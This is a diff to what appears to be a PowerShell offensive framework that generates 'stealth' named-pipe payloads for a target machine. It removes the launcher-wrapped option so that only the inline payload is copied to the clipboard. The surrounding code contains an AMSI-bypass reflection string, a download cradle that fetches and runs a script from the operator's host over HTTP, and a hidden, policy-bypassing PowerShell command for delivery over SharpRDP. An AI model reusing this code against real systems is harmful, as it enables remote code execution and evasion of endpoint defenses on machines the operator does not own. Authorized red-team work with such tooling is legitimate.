@@ -3171,16 +3171,11 @@ while (`$true) {
 		}
 		elseif($chosenFormat -eq 'stealth'){
 			$built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
-			$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
-			Write-Output " [1] Inline PS -- paste into existing session"
+			Write-Output " Inline PS -- paste into existing PS session on target:"
 			Write-Output " $($built.InlinePS)"
 			Write-Output ""
-			Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)"
-			Write-Output " $wrapped"
-			Write-Output ""
-			Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -Foreground yellow -NoNewline
-			$_sc = (Read-Host).Trim()
-			$_clipPayload = if ($_sc -eq '2') { $wrapped } else { $built.InlinePS }
+			Write-Host " [*] Stealth payload copied to clipboard (inline PS only -- too large for command-line launchers; use b64/gzip for standalone delivery)" -ForegroundColor Yellow
+			$_clipPayload = $built.InlinePS
 		}
 		if ($_clipPayload) {
 			Set-Clipboard -Value $_clipPayload
@@ -3404,7 +3399,6 @@ while (`$true) {
 	elseif($chosenFormat -eq 'stealth'){
 		$stealthSID = if($global:Detach){'S-1-1-0'} else {$SID}
 		$built = New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID
-		$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
 		# Pre-build SharpRDP cradle: write InlinePS to operator disk so serve can host it.
 		# The full -enc b64 of InlinePS is ~10k chars — exceeds cmd.exe's 8191-char keyboard
 		# injection buffer in SharpRDP, silently truncating the payload. A download cradle
@@ -3415,11 +3409,8 @@ while (`$true) {
 		$_rdpAmsi     = "[ref].assembly.gettype('system.management.automation.amsiutils',`$false,`$true).getfield('amsiinitfailed',41).setvalue(`$null,`$true)"
 		$_rdpCradle   = "iex(new-object net.webclient).downloadstring('http://$_operatorIP`:8080/$_pipeFile')"
 		$_sharpRDPCmd = "command=powershell -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
-		Write-Output " [1] Inline PS -- paste into existing session on target"
+		Write-Output " Inline PS -- paste into existing PS session on target:"
 		Write-Output " $($built.InlinePS)"
-		Write-Output ""
-		Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)"
-		Write-Output " $wrapped"
 		Write-Output ""
 		# Write pipe file to disk for sharprdp last-resort delivery (serve-based download cradle).
 		# winrm delivery uses $global:LastInlinePS directly — no serve or disk file needed.
@@ -3427,9 +3418,8 @@ while (`$true) {
 		$global:LastSharpRDPB64 = $_sharpRDPCmd
 		$global:LastSharpRDPCradleFile = $_pipeFile
 		$global:LastInlinePS = $built.InlinePS
-		Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -Foreground yellow -NoNewline
-		$_sc = (Read-Host).Trim()
-		$_clipPayload = if ($_sc -eq '2') { $wrapped } else { $built.InlinePS }
+		Write-Host " [*] Stealth payload copied to clipboard (inline PS only -- too large for command-line launchers; use b64/gzip for standalone delivery)" -ForegroundColor Yellow
+		$_clipPayload = $built.InlinePS
 	}
 	if ($_clipPayload) {
 		Set-Clipboard -Value $_clipPayload
